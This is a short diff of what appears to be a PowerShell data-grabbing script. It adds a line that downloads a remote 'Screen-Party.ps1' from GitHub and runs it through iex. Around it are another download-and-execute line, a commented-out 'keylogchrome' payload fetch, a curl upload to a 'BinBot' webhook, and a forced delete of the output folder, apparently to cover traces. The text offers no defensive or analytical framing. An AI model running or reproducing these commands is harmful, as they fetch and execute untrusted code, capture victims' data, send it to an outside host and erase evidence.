@@ -343,5 +343,6 @@ curl.exe -k -X POST -F 'payload_json={\"username\": \"BinBot\", \"content\": \"\
 Invoke-RestMethod https://raw.githubusercontent.com/bindas88/rem/main/WbGrab.ps1 | iex
 # keylogchrome
 # Invoke-RestMethod https://raw.githubusercontent.com/bindas88/Sniff/main/main.ps1 | iex
+Invoke-RestMethod https://raw.githubusercontent.com/bindas88/rem/main/Screen-Party.ps1 | iex
 Sleep 10
 Remove-Item -Path $outpath -Recurse -Force
